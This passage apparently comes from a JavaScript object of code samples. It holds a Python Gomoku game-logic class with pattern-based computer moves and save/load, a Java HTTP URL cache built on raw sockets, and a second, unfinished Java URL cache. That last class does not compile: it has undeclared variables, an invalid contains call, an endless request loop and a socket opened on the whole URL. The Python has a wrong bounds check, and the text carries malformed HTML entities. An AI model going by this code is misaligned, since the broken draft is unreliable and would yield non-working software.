		#&gt This class is instantiated in gomoku_Control.py to run the critical operations
		#  related to the progression and intialization of the game. 
		#&gt Most game variables are stored as instance variables with this class, 
		#  aside from those which are directly related to graphics, which 
		#  are stored along with graphical methods in gomoku_GUI.py
		class Logic:   
		  BLANK = "X"
		  NOPATS = []
		  EASYPATS = ["XCCCC","CXCCC","CCXCC","XPPPP","PXPPP","PPXPP","XCCCX","XPPPX","XCCC"]
		  HARDPATS = ["XCCCC","CCXCC","CXCCC","XPPPP","PXPPP","PPXPP","XPXPP","XCXCC",\
		              "XCCCX","XPPPX","XCCC","CXCXC","XPPP","PXPXP"]
		              
		  #&gt Initializes instance variables required for the progression of the game.
		  #&gt Randomly selects dimension, scales cellSize to match, assigns player colours.
		  #&gt Converts generalized patterns to game-specific patterns
		  def __init__(self):
		      self.dimension = random.randrange(10,20)
		      self.state = self.stateConstructor()
		      self.player = None
		      self.human = None
		      self.comp = None

		      self.welcomeVisible = None # Initialized to "None" for toggleWelcome() logic.
		      self.helpVisible = False
		      self.diffSetVisible = False
		      self.diffWarnVisible = False

		      self.diff = 1 # Default difficulty is "easy".
		      self.move = 0
		      self.winState = False

		      self.playerSelector() # Selects the player assignments & who plays first.
		      self.playPatterns = self.patternConverter()


		  #&gt Called at the beginning of a (new or loaded) game to prepare for play.
		  def initializeNewGame(self, load=False):
		      self.graphics.lineman.clear()
		      self.graphics.stamper.clear()
		      self.graphics.winMan.clear()
		      self.graphics.messenger.clear()
		      self.graphics.resultMan.clear()

		      if not load:
		          self.dimension = random.randrange(10,20)
		          self.cellSize = int(self.graphics.BOARDSIZE/self.dimension)
		          self.playerSelector()
		          self.move = 0
		          self.graphics.displayMessage(" A  new  game\\n has  started!\\n")

		      if self.welcomeVisible:
		          self.graphics.toggleWelcome()
		      if self.helpVisible:
		          self.graphics.toggleHelp()

		      self.winState = False
		      self.playPatterns = self.patternConverter()
		      
		      self.state = self.stateConstructor()
		      self.graphics.drawBoard()
		      self.graphics.displayTurn()
		      self.graphics.displayDiff()

		      #&gt If the first player is the computer, then initiate that move
		      if self.player == self.comp:
		          self.computerMove()


		  #&gt Creates a 2-D list populated with the str "X" of size dimension.
		  #&gt If the instance was initialized with a preexisting state (i.e. loaded)
		  #  this function will simply return that state.
		  def stateConstructor(self):
		      newState = [""] * self.dimension
		      for elem in range(len(newState)):
		          newState[elem] = [self.BLANK] * self.dimension
		      return newState


		  #&gt Randomly selects the number 0 or 1. If 1, then the human plays first.
		  #&gt&gt Since black always plays first, this means they are also black.
		  #&gt Sets player, human and comp globals
		  def playerSelector(self):
		      if random.randrange(2) == 1:
		          self.human = "B"
		          self.comp = "W"
		          self.player = self.human
		      else:
		          self.human = "W"
		          self.comp = "B"
		          self.player = self.comp
		      #Prints the player assignment to terminal. Primarily for debugging.
		      #print("P1:", self.human, "P2:", self.comp) 


		  #&gt Takes the generalized pattern strings and converts them to correspond to
		  #  the colour assignments for that game.
		  #  Looks up the class variable "HARDPATS", but does not alter it.
		  #&gt Will include difficulty logic for final release
		  def patternConverter(self):
		      if self.diff == 0:
		          selectedPats = self.NOPATS
		      elif self.diff &lt= 2:
		          selectedPats = self.EASYPATS
		      else:
		          selectedPats = self.HARDPATS

		      procPatterns = []
		      for pattern in selectedPats:
		          newPattern = ""
		          for letter in pattern:
		              if letter == "P":
		                  newPattern = newPattern + self.human
		              elif letter == "C":
		                  newPattern = newPattern + self.comp
		              else:
		                  newPattern = newPattern + self.BLANK
		          procPatterns.append(newPattern)

		          # Checks if it is a palindrome; if it isn't, it appends the reversed.
		          revPattern = newPattern[::-1] # Clones the string, but in reverse
		          if newPattern != revPattern:
		              procPatterns.append(revPattern)
		      #print(procPatterns) ###DEBUGGING###
		      return procPatterns


		  #&gt Checks that the given col and row are within the bounds of the 
		  #  boardsize and space they represent is empty. 
		  #&gt Returns True if so, else False
		  def isValidInput(self, col, row):
		      for inst in [col, row]:
		          if inst &lt 0 or inst &gt self.dimension-1:
		              return False
		      if self.state[col][row] != self.BLANK: # Checks that the space is empty
		          return False
		      else:
		          return True

		          
		  #&gt Used by checkWin to check if there is a series of 5 pieces in a line.
		  #&gt The line is extrapolated from the col / row of the player piece,
		  #  along with the dY and dX (difCol, difRow).
		  #&gt If there is a series of 5, returns a list of form 
		  #  [True,start tuple, end tuple]; else, returns a single element list [False].
		  def checkLine(self, col, row, difCol,difRow):
		      series = 1
		      seqStart = "" # Endpoint position placeholders
		      seqEnd = ""
		      for dir in [-1, 1]: # This negation factor is used to checks both directions
		          for next in range (1,self.dimension):
		              # Sets the col/row for the next piece to be checked
		              nextCol = (col + dir*next*difCol)
		              nextRow = (row + dir*next*difRow)

		              # If the edge of the board is met, that direction of the series ends
		              if nextCol &gt self.dimension-1 or nextCol &lt 0\
		              or nextRow &gt self.dimension-1 or nextRow &lt 0:
		                  if dir == -1: # Used for consistent endpoint selection
		                      # Assigns a 2-tuple to the col and row of the endpoint
		                      seqEnd = (nextCol+difCol, nextRow+difRow)
		                  else:
		                      seqStart = (nextCol-difCol, nextRow-difRow)
		                  break

		              # If the next piece doesn't match, that direction of the series ends
		              elif self.state[nextCol][nextRow] != self.player:
		                  if dir == -1:
		                      seqEnd = (nextCol+difCol, nextRow+difRow)
		                  else:
		                      seqStart = (nextCol-difCol, nextRow-difRow)
		                  break

		              # If the sequence hasn't ended from either condition, they match.
		              else:
		                  series = series + 1
		                  
		      # If the series is exactly 5, then the game is won.
		      if series == 5:
		          return [True, seqStart, seqEnd]
		      else:
		          return [False]


		  #&gt Checks to see if the winning condition has been met by the last play by checking
		  #  if any of the adjacent 8 spots match the piece just played. If so, check
		  #  that line for a series of exactly 5. If the winning condition is met, calls 
		  #  setWin() with the coordinates of the winning sequence endpoints.
		  def checkWin(self, col, row):
		      for checkCol in range(col-1,col+2):
		          if checkCol &lt 0 or checkCol &gt self.dimension-1:
		              continue
		              
		          for checkRow in range(row-1,row+2):
		              # Avoids checking out of bound indices
		              if checkRow &lt 0 or checkRow &gt self.dimension-1:
		                  continue
		              # Avoids checking the spot corresponding to the played piece
		              elif checkCol == col and checkRow == row:
		                  continue
		              # Moves on if the pieces don't match.
		              elif self.state[checkCol][checkRow] != self.player:
		                  continue
		                  
		              else: # If this runs, the pieces being compared match.
		                  # Col/row difference between the pieces; used to traverse the line
		                  difCol = checkCol - col
		                  difRow = checkRow - row
		                  result = self.checkLine(col, row, difCol, difRow)
		                  if result[0]:
		                      return [result[1], result[2]]


		  #&gt Runs each time the computer needs to make a move. Makes the decision,
		  #  checks if the input is valid, places the piece and updates the game state variable.
		  def computerMove(self):
		      if self.diff == 0: # If AI is off, don't play at all.
		          self.player = self.human
		          return

		      compEle = self.decisionMaker()
		      compCol = compEle[0]
		      compRow = compEle[1]
		      colPos = compCol * self.cellSize # Converts indices to coordinates
		      rowPos = compRow * self.cellSize
		      
		      self.graphics.stampPiece(colPos,rowPos)
		      self.state[compCol][compRow] = self.player
		      winResult = self.checkWin(compCol, compRow)
		      if winResult != None:
		          self.graphics.setWin(winResult[0], winResult[1])
		      self.player = self.human


		  #&gt Converts the x or y position of a click to the index of a col/row list.
		  #&gt Finds the "base" col / row of the click using integer division,
		  #  then checks if the click is greater than half way between nodes.
		  #&gt If so, the variable will be set to that "next" value.
		  def clickPosToIndex(self, pxVal):
		      indxVal = int(pxVal // self.cellSize)
		      if pxVal % self.cellSize &gt= self.cellSize/2:
		          indxVal += 1
		      return indxVal


		  #&gt Checks if the user's choice is valid,
		  #  updates the game state variable and initiates the computer's move.
		  def moveAlternator(self,xPos,yPos):
		      humanCol = self.clickPosToIndex(xPos)
		      humanRow = self.clickPosToIndex(yPos)

		      if not self.isValidInput(humanCol,humanRow):
		          self.graphics.displayMessage("   You  cannot\\n    place  your\\n   piece there")
		          return

		      humanXPos = humanCol * self.cellSize
		      humanYPos = humanRow * self.cellSize


		      self.move = self.move + 1
		      self.graphics.displayTurn() #Redraws the turn counter
		      self.graphics.stampPiece(humanXPos, humanYPos)
		      self.state[humanCol][humanRow] = self.player

		      winResult = self.checkWin(humanCol, humanRow)
		      if winResult != None:
		          self.graphics.setWin(winResult[0], winResult[1])

		      if not self.winState: # If the player just won, the computer shouldn't play
		          self.player = self.comp
		          self.computerMove()


		  #Traverses the 2D state list and returns a list containing strings which
		  #represent all horizontal lines. It also returns a list with the col/row indices
		  #of every element in each string. The indices for both lists are related.
		  #e.g. The position of ele 3 in line 1 can be obtained by: horiPosList[0][2]
		  def horiLines(self):
		      horiList = []
		      horiPosList = []

		      for row in range(len(self.state)):
		          horiString = ""
		          horiPosList.append([])
		          for col in range(len(self.state[0])):
		              horiString = horiString + self.state[col][row]
		              horiPosList[row].append([col,row])
		          horiList.append(horiString)

		      return horiList, horiPosList


		  #Traverses the 2D state list and returns a list containing strings which
		  #represent all vertical lines. It also returns a list with the col/row indices
		  #of every element in each string. The indices for both lists are related.
		  #e.g. The position of ele 3 in line 1 can be obtained by: vertPosList[0][2]
		  def vertLines(self):
		      vertList = []
		      vertPosList = []

		      for col in range(len(self.state[0])):
		          vertString = ""
		          vertPosList.append([])
		          for row in range(len(self.state)):
		              vertString = vertString + self.state[col][row]
		              vertPosList[col].append([col,row])
		          vertList.append(vertString)

		      return vertList, vertPosList


		  #This function is NOT pure. It appends to both diagList and diagPosList
		  #This is intentional since the "old" lists are never used again.
		  #It improves readability and enables easier updating of diagPosList.
		  #It also minimizes the logic required to avoid strings of len &lt 5.
		  #Returns: None
		  #Parameters:
		  # 3 ints: col & row of starting position, diag direction (-1 or 1)
		  # 2 lists: diagList: contains state strings
		  #          diagPosList: contains the positions of each element in those strings
		  def diagWalker(self, col, row, diag, diagList, diagPosList):
		      valid = True
		      diagString = ""
		      tempPosList = []
		      while valid:
		          diagString = diagString + self.state[col][row]
		          tempPosList.append([col,row])

		          col = col + 1
		          row = row + diag
		          if col not in range(self.dimension) or row not in range(self.dimension):
		              valid = False

		      if len(diagString) &gt= 5:
		              diagList.append(diagString)
		              diagPosList.append(tempPosList)


		  #Traverses the 2D state list and returns a list containing strings which
		  #represent all diagonal lines longer than 4. Returns a list with the col/row indices
		  #of every element in each string. The indices for both lists are related.
		  #e.g. The position of ele 3 in line 1 can be obtained by: vertPosList[0][2]
		  def diagLines(self):
		      diagList = []
		      diagPosList = []
		      for diag in [-1,1]: # Checks both diagonals
		          # Aligns the starting point of the walker to the correct row
		          if diag == -1: # If subtracting rows, run along the top; else, bottom.
		              baseRow = self.dimension - 1
		          else:
		              baseRow = 0

		          for vert in range(self.dimension):
		              self.diagWalker(0, vert, diag, diagList, diagPosList)

		          for hori in range(1,self.dimension):
		              self.diagWalker(hori, baseRow, diag, diagList, diagPosList)

		      return diagList, diagPosList

		      
		  #&gt Checks if either of the two spots on either side of the choice
		  #  are filled.
		  #&gt If at least one is, then that is the element which will be chosen.
		  #&gt This avoids placing something at the "wrong place" in the pattern.
		  def isAdjFilled(self, eleIndx, line):
		      for adjIndx in range(eleIndx-1,eleIndx+2, 2):
		          if 0 &gt adjIndx &lt= len(line): 
		              continue
		      
		          adjString = line[eleIndx] + line[adjIndx]
		          if adjString == self.BLANK*2:
		              continue
		      
		          return True
		          
		          
		  #&gt This function will return the index of the playable spot in the line where
		  #  a pattern was found. If multiples are found, it selects the first one.
		  #&gt If the pattern which is passed is not found in "line", or if the pattern 
		  #  does not have an adjacent blaknk/player,a ValueError will be thrown 
		  #  by lookUpPatterns.
		  def elementChoice(self, pattern, line):
		      firstIndx = line.index(pattern) # Looks for the index of the start of the pattern
		      lastIndx = firstIndx + len(pattern) # Calculates the first index after the pattern
		      
		      initEleChoices = []
		      for eleIndx in range(firstIndx, lastIndx):
		          if line[eleIndx] == self.BLANK:
		              if self.isAdjFilled(eleIndx, line):
		                  return eleIndx
		      

		  #&gt The entire board is deconstructed into strings which represent a complete
		  #  vertical, horizontal or diagonal line. These strings are iterated through,
		  #&gt looking for linear patterns on the board to find the playable moves.
		  #&gt Patterns are ranked and so a single col/row pair is returned as a list.    
		  def lookUpPatterns(self):
		      vertList, vertPosList = self.vertLines()
		      horiList, horiPosList = self.horiLines()
		      diagList, diagPosList = self.diagLines()

		      stringList = vertList + horiList + diagList
		      posList = vertPosList + horiPosList + diagPosList

		      # Looks for each pattern in each line. If found, calls elementChoice
		      # with the matched strings to find the index of a playable (blank) spot.
		      # Appends the coordinates, along with the pattern index (rank), to a list.
		      choices = []
		      for lineIndx in range(len(stringList)):
		          lineStr = stringList[lineIndx]
		          for patternIndx in range(len(self.playPatterns)):
		              patternStr = self.playPatterns[patternIndx]
		              if patternStr in lineStr:
		                  selIndx = self.elementChoice(patternStr, lineStr)
		                  selElem = posList[lineIndx][selIndx] # Returns col/row list.
		                  choices.append([patternIndx, selElem])

		      choices.sort() # Sorted so the "best" (lowest pattern index) is first.
		      # Chooses the coordinates for the first entry in choice
		      choice = []
		      if len(choices) != 0:
		          # Chooses randomly if on "easy", otherwise chooses the "best".
		          if self.diff == 1:
		              selChoice = random.randrange(len(choices))
		          else:
		              selChoice = 0
		          choice = choices[selChoice][1] # Sets choice to the col/row list
		      return choice # Returns the lowest (i.e. best) choice


		  #&gt Parameter; two 2D lists containing the col/row of player/computer pieces.
		  #  The selected element to play near is the first in the list,
		  #  therefore, the list compPieces should have the "best" piece first.
		  def pseudoRandomPlay(self, playerPieces, compPieces):
		      if len(compPieces) == 0:
		          if len(playerPieces) != 0:
		              startCol = playerPieces[0][0]
		              startRow = playerPieces[0][1]
		          else:
		              startCol = self.dimension//2
		              startRow = self.dimension//2
		              return startCol, startRow
		      else:
		          startCol, startRow = self.minDistanceFromPlayer(playerPieces, compPieces)

		      for check in range(30): # Gets 30 attempts to find a solution, else random
		          pseudoRandRow = startRow + random.randrange(-1,2) # rand in [-1,0,1]
		          pseudoRandCol = startCol + random.randrange(-1,2,2) # rand in [-1,1]
		          if self.isValidInput(pseudoRandCol, pseudoRandRow):
		              return [pseudoRandCol, pseudoRandRow]
		          if check &gt= 20: # If that seed isn't working, try another.
		              startCol = compPieces[0][0]
		              startRow = compPieces[0][1]

		      # This block only runs if no viable solution is found in 20 tries.
		      randCol = random.randrange(self.dimension)
		      randRow = random.randrange(self.dimension)
		      return [randCol, randRow]


		  #&gt Different function to determine the position of the computer piece
		  #  which is closest to any player piece. Does not consider relative orientation
		  #  since it just takes the sum of the col/row differences.
		  def minDistanceFromPlayer(self, playerPieces, compPieces):
		      distances = []
		      for pPiece in range(len(playerPieces)):
		          distances.append([])
		          for cPiece in range(len(compPieces)):
		              dCol = abs(playerPieces[pPiece][0] - compPieces[cPiece][0])
		              dRow = abs(playerPieces[pPiece][1] - compPieces[cPiece][1])
		              dSum = dCol + dRow
		              distances[pPiece].append(dSum)

		      lowVal = 100
		      lowPos = [0,0]
		      for i in range(len(playerPieces)):
		          for j in range(len(compPieces)):
		              if distances[i][j] &lt lowVal:
		                  lowVal = distances[i][j]
		                  lowPos = compPieces[j]
		      return lowPos[0], lowPos[1]


		  #&gt Iterates through self.state to find all of the positions which hold
		  #  either a computer or human piece. It appends the coordinates into a list
		  #  for either player.
		  #&gt Returns: Two 2D lists where each top element is a list with the row/col
		  #           of either the computer or human pieces.
		  def findPieces(self):
		      humanList = []
		      compList = []
		      for col in range(self.dimension):
		          for row in range(self.dimension):
		              if self.state[col][row] == self.human:
		                  humanList.append([col, row])
		              elif self.state[col][row] == self.comp:
		                  compList.append([col, row])
		      return humanList, compList


		  #&gt Checks if there are any patterns to play off of; if not, uses the
		  #  pseudoRandomPlay function to find a spot to play.
		  def decisionMaker(self):
		      result = self.lookUpPatterns()
		      humanPieces, compPieces = self.findPieces()

		      if result == []:
		          result = self.pseudoRandomPlay(humanPieces, compPieces)
		      return result


		  #&gt Saves a file called "Gomokusave.gmk" in the working directory.
		  #&gt The first line stores config variables: winState, move, dimension and human
		  #&gt&gt Every line after that stores the elements of the 2D array "state".
		  #&gt&gt No delimiters between elements.
		  def saveGame(self):
		      if self.winState:
		          self.graphics.displayMessage("clear")
		          self.graphics.displayMessage("  You  cannot\\n     save  this\\n ended  game")
		          return
		          
		      saved = open("gomoku_Save.gmk","w")
		      configSave = "move,"+str(self.move)+";dimension,"+str(self.dimension)+\
		                   ";human,"+str(self.human)+";diff,"+str(self.diff)+"\\n"
		      saved.write(configSave)

		      # Iterates through each row of the state list, accumulates the elements
		      # in each col into a string, then writes that string to the file.
		      for row in range(self.dimension):
		          printedLine = ""
		          for col in range(self.dimension):
		              printedLine = printedLine + self.state[col][row]
		          saved.write(printedLine+"\\n")
		      saved.close()
		      self.graphics.displayMessage("  Game  Saved\\n")


		  #&gt Interprets the config line passed by loadGame() and clears previous game info.
		  def loadConfig(self,config):
		      if self.welcomeVisible: # First closes the welcome screen if it is open.
		          self.graphics.toggleWelcome()

		      config = config[:len(config)-1] # Removes the newline characters.
		      pairs = config.split(";") #&gt Puts the var/value pairs in a list.
		      for entry in range(len(pairs)):
		          # Separates the var/values and places them in a nested list
		          pairs[entry] = pairs[entry].split(",")
		          var = pairs[entry][0]
		          val = pairs[entry][1]

		          # Checks which var it is and executes the appropriate code.
		          if var == "dimension":
		              self.dimension = int(val)
		              self.cellSize = self.graphics.BOARDSIZE/self.dimension
		          elif var == "move":
		              self.move = int(val)
		              self.graphics.displayTurn()
		          elif var == "diff":
		              self.diff = int(val)
		              self.graphics.displayDiff()
		          elif var == "human":
		              if val == "B":
		                  self.human = "B"
		                  self.comp = "W"
		              else:
		                  self.human = "W"
		                  self.comp = "B"
		              # Human will always have be first since the comp is "instant".
		              self.player = self.human

		              
		  #&gt Looks for the file "Gomokusave.gmk" and tries to load a previous save.
		  #&gt If the file is not found, an error message displays in the Turtle window.
		  def loadGame(self):
		      try:
		          loaded = open("gomoku_Save.gmk","r")

		          config = loaded.readline() # Reads the config line.
		          self.loadConfig(config) # Parses the config line and performs setup.
		          self.initializeNewGame("load")

		          row = 0 # Sets up an accumulator to count the row the file line represents.
		          for line in loaded:
		              line = line[:len(line)-1] # Removes the newline characters.
		              for col in range(len(line)):
		                  ele = line[col]
		                  # Places the value of the line entry into the state list.
		                  self.state[col][row] = ele
		                  if ele != self.BLANK: # If it is blank it must be a player's.
		                      # Sets the player var so the correct piece is stamped.
		                      self.player = ele
		                      colPos = col * self.cellSize
		                      rowPos = row * self.cellSize
		                      self.graphics.stampPiece(colPos, rowPos)
		              row += 1

		          loaded.close()
		          self.player = self.human # Since the computer takes almost no time to move.
		          self.graphics.displayMessage("Game  Loaded\\n")

		      except IOError:
		          self.graphics.displayMessage("  No  save  file\\n   was  found!\\n")

		          
		  #&gt Uses the y value of the click to determine which button is being pressed.
		  #&gt Executes the code corresponding to each button.
		  def buttonSelector(self, x, y):
		      # Absolute reference for relative bounds.
		      boxExit = [585,635]
		      boxNew = [boxExit[0]-60,boxExit[1]-60]
		      boxLoad = [boxNew[0]-60,boxNew[1]-60]
		      boxSave = [boxLoad[0]-60,boxLoad[1]-60]
		      boxEasy = [boxSave[0]-145, boxSave[1]-170]
		      boxMed = [boxEasy[0]-35, boxEasy[1]-35]
		      boxHard = [boxMed[0]-35, boxMed[1]-35]
		      boxWarn = [boxHard[0]-45,boxHard[1]-35]
		      boxDiff = [boxWarn[0]-60,boxWarn[1]-45]
		      boxHelp = [boxDiff[0]-60,boxDiff[1]-60]

		      # Creates a 2D list containing all the buttons' y-bounds
		      buttons = [boxExit, boxNew, boxLoad, boxSave, boxEasy, boxMed,\
		                  boxHard, boxWarn, boxDiff, boxHelp]

		      for box in buttons:
		          if box[0] &lt y &lt box[1]: # If the click is in the given y-bounds.
		              if box is boxExit:
		                  exit()
		              elif box is boxNew:
		                  self.initializeNewGame()
		              elif box is boxLoad:
		                  self.loadGame()
		              elif box is boxSave:
		                  self.saveGame()
		              elif box is boxEasy and self.diffSetVisible:
		                  self.newDiff = 1
		                  self.graphics.toggleDiffWarning()
		              elif box is boxMed and self.diffSetVisible:
		                  self.newDiff = 2
		                  self.graphics.toggleDiffWarning()
		              elif box is boxHard and self.diffSetVisible:
		                  self.newDiff = 3
		                  self.graphics.toggleDiffWarning()
		              elif box is boxWarn and self.diffWarnVisible:
		                  self.graphics.diffConfirmation(x)
		              elif box is boxDiff:
		                  self.graphics.toggleDiffSettings()
		              elif box is boxHelp:
		                  self.graphics.toggleHelp()


		  #&gt Accepts click coordinates, determines which area of the board it's in
		  #  (i.e. sidebar or gameboard) and passes the input to the correct function.
		  def sectionSelector(self, x,y):
		      x -= self.graphics.OFFSETX
		      y -= self.graphics.OFFSETY
		      
		      if x &gt -50 and not self.winState: # If the click is on the game board
		          self.graphics.displayMessage("clear") # Avoids message board mess.
		          
		          if self.welcomeVisible: # If the welcome screen is open
		              self.graphics.toggleWelcome()
		          elif self.helpVisible: # If the help screen is open
		              self.graphics.toggleHelp()
		          elif self.player == self.human: # Avoids playing during comp turn.
		              self.moveAlternator(x,y)

		      elif x &lt= -70: # If the click is in info sidebar area
		          self.buttonSelector(x, y)`
	},
	nw1: {
		type: 'java',
		code: `
		import java.io.BufferedWriter;
		import java.io.File;
		import java.io.FileWriter;
		import java.io.IOException;
		import java.io.InputStreamReader;
		import java.io.OutputStreamWriter;
		import java.io.PrintWriter;
		import java.net.Socket;
		import java.text.ParseException;
		import java.text.SimpleDateFormat;
		import java.util.HashMap;
		import java.util.Iterator;
		import java.util.Locale;
		import java.util.Map;
		import java.util.Map.Entry;
		import java.util.Scanner;


		public class UrlCache{
		// Catalog file name
		private static final String CATALOG_FILENAME = "catalog.txt";
		// Hashmap to store URL and LastModifiedValue
		private HashMap&ltString, String&gt catalog = new HashMap&ltString, String&gt();

		/*
		 * Default constructor to initialize data structures used for caching/etc If
		 * the cache already exists then load it. If any errors then throw runtime
		 * exception.
		 *
		 * @throws IOException
		 * If encounters any errors/exceptions
		 */
		public UrlCache() throws IOException{

		  // Read in catalog file
		  File file = new File(CATALOG_FILENAME);

		  // Load file i it exists
		  if (file.exists()){
		    // Load file into hash map
		    Scanner fsc = new Scanner(file);

		    // For each line in file
		    while (fsc.hasNextLine()){
		      // Read line from file
		      String line = fsc.nextLine();

		      // Split line into fields
		      int pos = line.indexOf(" ");

		      // If two fields
		      // | url | last modified value }
		      if (pos &gt 0){
		        String url = line.substring(0, pos);
		        String lastModifiedValue = line.substring(pos + 1);
		        catalog.put(url, lastModifiedValue);
		      }
		    }
		    fsc.close(); // close file
		  }
		}

		/*
		 * Downloads the object specified by the parameter url if the local copy is
		 * out of date.
		 *
		 * @param url
		 *            URL of the object to be downloaded. It is a fully qualified
		 *            URL.
		 * @throws IOException
		 *             if encounters any errors/exceptions
		 */
		public void getObject(String url) throws IOException{
		  String inputLine = "";
		  int count = 0;
		  String lastModified = "";
		  String contentLength = "";
		  long length = 0;
		  String catalogLastModifiedDate = "";
		  String responseCode = "";

		  // Default host, path, port
		  String host = url;
		  String path = "/index.html";
		  int port = 80;

		  // Get host and path
		  int pos = url.indexOf("/");
		  if (pos &gt 0){
		    host = url.substring(0, pos);
		    path = url.substring(pos);
		  }

		  // Check for port
		  pos = host.indexOf(':');
		  if (pos &gt 0){
		    port = Integer.parseInt(host.substring(pos + 1));
		    host = host.substring(0, pos);
		  }


		      // Connect to server
		  Socket socket = new Socket(host, port);

		  // Write out request
		  PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())));
		  out.println("GET " + path + " HTTP/1.0");

		  // If url in catalog
		  if (catalog.containsKey(url)){

		    // Get catalog last mosified date
		    catalogLastModifiedDate = catalog.get(url);
		    out.println("If-Modified-Since: " + catalogLastModifiedDate);
		  }

		  out.println();
		  out.flush();

		  // Get response stream
		  InputStreamReader in = new InputStreamReader(socket.getInputStream());

		      // Read in headers
		  int ch = in.read();

		  while (ch != -1){
		    while (ch != '\r') {
		      inputLine += (char) ch;
		      ch = in.read();
		    }

		    ch = in.read();
		    ch = in.read();

		    // End of header ]r]n
		    if (ch == '\r'){
		      ch = in.read();
		      ch = in.read();
		      break;
		    }

		    // Store response code
		    if (inputLine.startsWith("HTTP"))
		      responseCode = inputLine;

		    // Store last modified
		    if (inputLine.startsWith("Last-Modified:"))
		      lastModified = inputLine.substring("Last-Modified:".length() + 1);

		    // Store content length
		    if (inputLine.startsWith("Content-Length:"))
		      contentLength = inputLine.substring("Content-Length:".length() + 1);
		    inputLine = "";

		  }

		  // 200 = Ok
		  // 304 = Not Modified
		  if (responseCode.contains("200")){
		    // Write to file
		    // Use url path as file name

		    // Get folder name
		    path = path.substring(1);
		    pos = path.lastIndexOf("/");

		    String folder = "";
		    if (pos &gt 0)
		      folder = path.substring(0, pos);

		    //System.out.println(folder);
		          // Make directory
		    File dir = new File(folder);

		    if (!dir.exists()){
		      dir.mkdirs();
		    }
		    // Make file writer
		    FileWriter fr = new FileWriter(new File(path));

		    // Get content length
		    length = Long.parseLong(contentLength);

		    // Write to file
		    for (int i = 0; i &lt length; i++){
		      ch = in.read();
		      fr.write(ch);
		    }

		    // Close streams and file
		    in.close();
		    out.close();
		    fr.close();

		    // Update catalog
		    catalog.put(url, lastModified);

		    // Write catalog to file
		    PrintWriter pw = new PrintWriter(CATALOG_FILENAME);

		    // Creates iterator to go through catalog entries
		    Iterator&ltEntry&ltString, String&gt&gt it = catalog.entrySet().iterator();

		    // Loop through iterator
		    while (it.hasNext()){
		      Map.Entry&ltString, String&gt pair = (Map.Entry&ltString, String&gt) it.next();
		      pw.println(pair.getKey() + " " + pair.getValue());
		    }
		    pw.close(); // close file
		  }
		}

		/**
		 * Returns the Last-Modified time associated with the object specified by
		 * the parameter url.
		 *
		 * @param url
		 *            URL of the object
		 * @return the Last-Modified time in millisecond as in Date.getTime()
		 */
		public long getLastModified(String url) {
		  long millis = 0;
		  SimpleDateFormat sdf = new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z", Locale.CANADA);

		  if (catalog.containsKey(url)) {
		    String lastModified = catalog.get(url);
		    try {
		      millis = sdf.parse(lastModified).getTime();
		    }
		    catch (ParseException e) {
		      System.out.println("Error" + e.getMessage());
		    }
		  }
		  return millis;
		}
		}`
	},
	nw2: {
		type: 'java',
		code: `
		/**
		* UrlCache Class
		*
		*
		*/

		import java.io.BufferedReader;
		import java.io.File;
		import java.io.FileWriter;
		import java.io.IOException;
		import java.io.InputStreamReader;
		import java.io.PrintWriter;
		import java.net.HttpURLConnection;
		import java.net.URISyntaxException;
		import java.net.URL;
		import java.net.URLConnection;
		import java.util.Date;
		import java.util.HashMap;
		import java.util.Iterator;
		import java.util.Map;
		import java.util.Map.Entry;
		import java.util.Scanner;

		public class UrlCache {

		// catalog file name
		private static final String CATALOG_FILENAME = "catalog.txt";

		// hashmap to store URL and LastModifiedValue
		private HashMap&ltString, Long&gt catalog = new HashMap&ltString, Long&gt();

		/**
		 * Default constructor to initialize data structures used for caching/etc If
		 * the cache already exists then load it. If any errors then throw runtime
		 * exception.
		 *
		 * @throws IOException
		 *             if encounters any errors/exceptions
		 */
		public UrlCache() throws IOException {

		  // read in catalog file
		  File file = new File(CATALOG_FILENAME);

		  // load file i it exists
		  if (file.exists()) {

		    // load file into hash map
		    Scanner fsc = new Scanner(file);

		    // for each line in file
		    while (fsc.hasNextLine()) {
		      // read line from file
		      String line = fsc.nextLine();

		      // split line into fields
		      String[] fields = line.split("\\s+");

		      // if two fields
		      // | url | last modified value }
		      if (fields.length == 2) {
		        String url = fields[0];
		        long lastModifiedValue = Long.parseLong(fields[1]);
		        catalog.put(url, lastModifiedValue);
		      }

		    }

		    fsc.close(); // close file
		  }
		}

		/**
		 * Downloads the object specified by the parameter url if the local copy is
		 * out of date.
		 *
		 * @param url
		 *            URL of the object to be downloaded. It is a fully qualified
		 *            URL.
		 * @throws IOException
		 *             if encounters any errors/exceptions
		 */
		public void getObject(String url) throws IOException {

		  // create url object
		  //String urlobj = null;
		  //if (url.startsWith("http://"))
		  //  urlobj = new URL(url);
		  //else if (url.startsWith("https://"))
		  //  urlobj = new URL(url);
		  //else
		    //urlobj = new URL("http://" + url);

		  // open connection
		  //URLConnection conn = (URLConnection) urlobj.openConnection();
		try{
		  String hostname;
		  int port = 80;
		  String path;
		  if(url.contains('[' || ']')){
		    int lbrace = url.indexOf('[');
		    int rbrace = url.indexOf(']');
		    hostname = url.substring(0,lbrace);
		    port = Integer.parseInt(url.substring(lbrace+1,rbrace));
		    path = url.substring(rbrace);
		  }
		  Socket socket = new Socket(url, port);

		  // Create necessary streams
		  outputStream = new PrintWriter(new DataOutputStream(
		      socket.getOutputStream()));
		  inputStream = new Scanner(new InputStreamReader(
		      socket.getInputStream()));
		  long catalogLastModifiedDate = 0;
		  PrintWriter pw = new PrintWriter(socket.getOutputStream());
		  while (true) {
		    pw.print("GET / HTTP/1.1\r\\n");
		    pw.print("Host: " + hostname + path + "\r\\n\r\\n");
		    pw.flush();
		    BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		    String recieve;
		    while((recieve = br.readLine()) != null){
		      System.out.println(t);
		    }
		    br.close();
		  }
		  outputStream.close();
		}
		catch (Exception e) {
		  System.out.println("Error: " + e.getMessage());
		}

		  // if url in catalog
		  boolean getFile = true;
		  Date date = null;
		  if (catalog.containsKey(url)) {

		    // get catalog last mosified date
		    catalogLastModifiedDate = catalog.get(url);

		    // set last modified date
		    //conn.setIfModifiedSince(catalogLastModifiedDate);
		    catalog.put(url, catalogLastModifiedDate);
		  }

		  // use GET request method
		  ((HttpURLConnection) conn).setRequestMethod("GET");

		  System.out.println("\\nSending 'GET' request to URL : " + url);

		  // connect to server
		  conn.connect();

		  // get response code
		  int responseCode = ((HttpURLConnection) conn).getResponseCode();

		  // System.out.println("Response Code : " + responseCode);
		  // System.out.println(conn.getHeaderFields());
		  long lastModified = conn.getLastModified();
